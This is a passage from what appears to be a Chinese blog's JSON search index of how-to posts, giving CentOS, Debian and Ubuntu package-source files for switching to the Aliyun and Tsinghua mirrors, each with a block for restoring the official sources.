/etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[BaseOS]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=BaseOS&infra=$infra\n#baseurl=http://mirror.centos.org/$contentdir/$releasever/BaseOS/$basearch/os/\ngpgcheck=1\nenabled=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS"]},{"title":"【国内镜像】Debian 10 buster 阿里云镜像","url":"/mirror/debian-10-buster-aliyun-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/debian/ buster main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib\ndeb http://mirrors.aliyun.com/debian-security buster/updates main\ndeb-src http://mirrors.aliyun.com/debian-security buster/updates main\ndeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib\ndeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian stretch main\ndeb http://security.debian.org/debian-security stretch/updates main\ndeb http://deb.debian.org/debian stretch-updates main\ndeb http://deb.debian.org/debian buster main\ndeb http://security.debian.org/debian-security buster/updates main\ndeb http://deb.debian.org/debian buster-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Debian","buster"]},{"title":"【国内镜像】Debian 10 buster 清华镜像","url":"/mirror/debian-10-buster-tuna-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian buster main\ndeb http://security.debian.org/debian-security buster/updates main\ndeb http://deb.debian.org/debian buster-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Debian","buster"]},{"title":"【国内镜像】Debian 8 jessie 阿里云镜像","url":"/mirror/debian-8-jessie-aliyun-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/debian/ jessie main non-free contrib\ndeb http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ jessie main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contrib\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian jessie main\ndeb http://security.debian.org/debian-security jessie/updates main\ndeb http://deb.debian.org/debian jessie-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Debian","jessie"]},{"title":"【国内镜像】Debian 8 jessie 清华镜像","url":"/mirror/debian-8-jessie-tuna-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie-updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie-updates main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie-backports main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ jessie-backports main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian-security jessie/updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security jessie/updates main contrib non-free\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian jessie main\ndeb http://security.debian.org/debian-security jessie/updates main\ndeb http://deb.debian.org/debian jessie-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Debian","jessie"]},{"title":"【国内镜像】Debian 9 stretch 阿里云镜像","url":"/mirror/debian-9-stretch-aliyun-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/debian/ stretch main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib\ndeb http://mirrors.aliyun.com/debian-security stretch/updates main\ndeb-src http://mirrors.aliyun.com/debian-security stretch/updates main\ndeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib\ndeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib\ndeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian stretch main\ndeb http://security.debian.org/debian-security stretch/updates main\ndeb http://deb.debian.org/debian stretch-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Debian","stretch"]},{"title":"【国内镜像】Debian 9 stretch 阿里云镜像","url":"/mirror/debian-9-stretch-tuna-mirror/","content":"\nDebian 是一个自由的操作系统（OS），提供您安装在计算机上使用。操作系统就是能让您的计算机工作的一系列基本程序和实用工具。\n\nDebian 不只是提供一个纯粹的操作系统：它还附带了超过 59000 个软件包，这些预先编译好的软件被打包成一种良好的格式以便于在您的机器上进行安装。\n\n## 替换镜像源\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-updates main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-backports main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ stretch-backports main contrib non-free\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian-security stretch/updates main contrib non-free\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security stretch/updates main contrib non-free\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/apt/sources.list\ndeb http://deb.debian.org/debian stretch main\ndeb http://security.debian.org/debian-security stretch/updates main\ndeb http://deb.debian.org/debian stretch-updates main\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/debian\n- https://mirrors.tuna.tsinghua.edu.cn/help/debian/\n- [【国内镜像】Debian 8 jessie 阿里云镜像](/mirror/debian-8-jessie-aliyun-mirror/)\n- [【国内镜像】Debian 9 stretch 阿里云镜像](/mirror/debian-9-stretch-aliyun-mirror/)\n- [【国内镜像】Debian 10 buster 阿里云镜像](/mirror/debian-10-buster-aliyun-mirror/)\n- [【国内镜像】Debian 8 jessie 清华镜像](/mirror/debian-8-jessie-tuna-mirror/)\n- [【国内镜像】Debian 9 stretch 清华镜像](/mirror/debian-9-stretch-tuna-mirror/)\n- [【国内镜像】Debian 10 buster 清华镜像](/mirror/debian-10-buster-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Debian","stretch"]},{"title":"【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像","url":"/mirror/ubuntu-14-04-aliyun-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\ndeb https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\ndeb-src https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\ndeb https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\ndeb-src https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n\ndeb https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\ndeb-src https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n\ndeb https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\ndeb-src https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n\n## Not recommended\n# deb https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n# deb-src https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ trusty main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty universe\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty universe\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty multiverse\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu trusty partner\n# deb-src http://archive.canonical.com/ubuntu trusty partner\n\ndeb http://security.ubuntu.com/ubuntu/ trusty-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ trusty-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security universe\ndeb http://security.ubuntu.com/ubuntu/ trusty-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像","url":"/mirror/ubuntu-14-04-tuna-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ trusty main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty universe\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty universe\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty multiverse\ndeb http://archive.ubuntu.com/ubuntu/ trusty-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ trusty-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu trusty partner\n# deb-src http://archive.canonical.com/ubuntu trusty partner\n\ndeb http://security.ubuntu.com/ubuntu/ trusty-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ trusty-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security universe\ndeb http://security.ubuntu.com/ubuntu/ trusty-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ trusty-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像","url":"/mirror/ubuntu-16-04-aliyun-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/ubuntu/ xenial main\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial main\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial universe\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial universe\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe\n\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-security main\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main\ndeb http://mirrors.aliyun.com/ubuntu/ xenial-security universe\ndeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ xenial main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial universe\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial universe\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial multiverse\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu xenial partner\n# deb-src http://archive.canonical.com/ubuntu xenial partner\n\ndeb http://security.ubuntu.com/ubuntu/ xenial-security main restricted\n# deb-src 